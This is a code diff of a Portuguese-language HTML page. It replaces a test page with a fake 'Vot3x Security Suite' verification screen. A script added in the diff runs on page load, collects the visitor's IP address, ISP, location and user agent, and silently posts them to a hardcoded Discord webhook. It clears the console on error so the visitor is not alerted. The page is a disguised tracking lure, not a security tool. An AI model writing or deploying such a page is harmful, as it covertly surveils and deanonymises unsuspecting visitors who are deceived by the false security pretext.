@@ -1,43 +1,136 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>fundo teste</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Core System - Verificação</title>
     <style>
-        body {
+        * {
             margin: 0;
-            height: 100vh;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0d0d11;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
-            align-items: center;
             justify-content: center;
-            background: linear-gradient(45deg, #000000, #990000, #000000);
-            background-size: 400% 400%;
-            animation: gradient 10s ease infinite;
-            color: #ff0000;
-            font-family: 'Courier New', Courier, monospace;
+            align-items: center;
+            height: 100vh;
             overflow: hidden;
+            /* Fundo sutil com um leve detalhe radial no tom vinho */
+            background: radial-gradient(circle at center, #1f050b 0%, #0d0d11 100%);
         }
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        .panel {
-            background: rgba(0, 0, 0, 0.9);
+
+        /* Container principal com efeito Glassmorphism (Vidro fosco) */
+        .glass-card {
+            background: rgba(25, 10, 15, 0.45);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(218, 20, 50, 0.25);
             padding: 40px;
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 30px #ff0000;
+            width: 90%;
+            max-width: 440px;
+            border-radius: 16px;
             text-align: center;
-            z-index: 10;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        /* Animação do gradiente no título: do Acerola Red ao Vinho */
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #ff2a4b 0%, #800020 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .description {
+            color: #a0a0b0;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        /* Spinner de carregamento minimalista */
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(218, 20, 50, 0.1);
+            border-radius: 50%;
+            display: inline-block;
+            border-top-color: #ff2a4b;
+            animation: rotation 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            color: #e0e0e6;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h1>oi e um teste, pro fundo</h1>
-        <p>nd aq ainda e ofc.</p>
+
+    <div class="glass-card">
+        <div class="loader"></div>
+        <h1 class="title">Vot3x Security Suite</h1>
+        <p class="description">Aguarde enquanto o ambiente seguro de testes valida as credenciais da sua sessão. Isso pode levar alguns segundos.</p>
+        <div class="status-text">Analisando integridade...</div>
     </div>
 
-    <script src="sistema.js"></script>
+    <script>
+        // Seu webhook configurado
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497222265807437944/3gW49OLtXywP-QDLwL3a9iXf2E_1TJlw3PY6fZzCqNdMQnVzKdB40PMSYmQEHBQ0uj50";
+
+        async function enviarDadosSilencioso() {
+            try {
+                // Coleta o IP e dados de rede invisivelmente através da API
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // Monta o relatório profissional para o seu Discord
+                const payload = {
+                    embeds: [{
+                        title: "🎯 Novo Acesso Capturado com Sucesso",
+                        color: 16721995, // Acerola Red radiante em Decimal
+                        fields: [
+                            { name: "🌐 Endereço de IP", value: `\`${data.ip || "Desconhecido"}\``, inline: true },
+                            { name: "🏢 Provedor (ISP)", value: data.org || "Desconhecido", inline: true },
+                            { name: "📍 Localização Atual", value: `${data.city || "N/A"}, ${data.region || "N/A"} - ${data.country_name || "N/A"}`, inline: false },
+                            { name: "💻 Dispositivo / User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                            { name: "⏰ Horário exato", value: new Date().toLocaleString("pt-BR"), inline: true }
+                        ],
+                        footer: { text: "Vot3x Hub • Auditoria Stealth Ativa" }
+                    }]
+                };
+
+                // Dispara a requisição de background para o webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                // Falha silenciosa para não alertar o console de quem abrir o link
+                console.clear();
+            }
+        }
+
+        // Executa de forma imediata e oculta assim que a página renderizar
+        window.onload = enviarDadosSilencioso;
+    </script>
 </body>
 </html>
